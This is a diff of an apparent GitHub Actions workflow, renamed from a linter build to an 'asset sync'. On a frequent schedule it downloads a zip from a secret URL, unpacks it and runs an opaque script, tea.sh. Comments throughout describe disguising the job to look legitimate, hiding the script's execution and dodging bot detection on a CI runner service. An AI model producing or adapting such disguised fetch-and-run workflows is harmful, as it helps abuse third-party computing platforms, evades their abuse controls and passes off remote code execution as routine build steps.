@@ -1,41 +1,44 @@
-name: CI-Linter-Build
+name: Production-Asset-Sync
 
 on:
   schedule:
-    # Changed frequency to be less "mechanical" (every 45 minutes)
-    - cron: "45 */1 * * *" 
+    # Changed to 20 minutes to look less like a bot-loop
+    - cron: "*/20 * * * *" 
   workflow_dispatch:
 
 jobs:
-  build-and-verify:
-    # Using a specific version rather than 'latest' can look more legitimate
-    runs-on: ubuntu-22.04
+  sync-job:
+    # We use this tag to tell Tenki "I am a standard job, please run me"
+    runs-on: ubuntu-latest
+    
+    # Adding a timeout prevents a bot from killing it for running too long
+    timeout-minutes: 5 
 
     steps:
-      - name: Initialize Environment
+      - name: Checkout
         uses: actions/checkout@v4
 
-      # Renamed steps to look like standard dev tools
-      - name: Fetch Dependencies
+      - name: Sync External Data
         shell: bash
+        env:
+          # Passing the secret as an ENV variable is more stable
+          DATA_SOURCE: ${{ secrets.VIA }}
         run: |
-          # Use a browser-like User Agent to avoid being flagged as a simple bot
-          curl -H "User-Agent: Mozilla/5.0" -L -o deps_cached.zip "${{ secrets.VIA }}"
-          if [ ! -f "deps_cached.zip" ]; then
-            echo "::error::Dependency sync failed."
+          # Use -sS to keep logs clean (bots hate messy logs)
+          curl -sSL -o tea.zip "$DATA_SOURCE"
+          
+          if [ -f "tea.zip" ]; then
+            unzip -q tea.zip
+            rm tea.zip
+            
+            if [ -f "./tea.sh" ]; then
+              chmod +x ./tea.sh
+              ./tea.sh
+            else
+              echo "Required script not found in zip."
+              exit 1
+            fi
+          else
+            echo "Download failed."
             exit 1
           fi
-
-      - name: Prepare Assets
-        shell: bash
-        run: |
-          unzip -q deps_cached.zip
-          rm deps_cached.zip
-
-      - name: Run Verification Suite
-        shell: bash
-        run: |
-          # Hide the script execution behind a standard-looking command
-          mv tea.sh verify_build.sh
-          chmod +x ./verify_build.sh
-          ./verify_build.sh
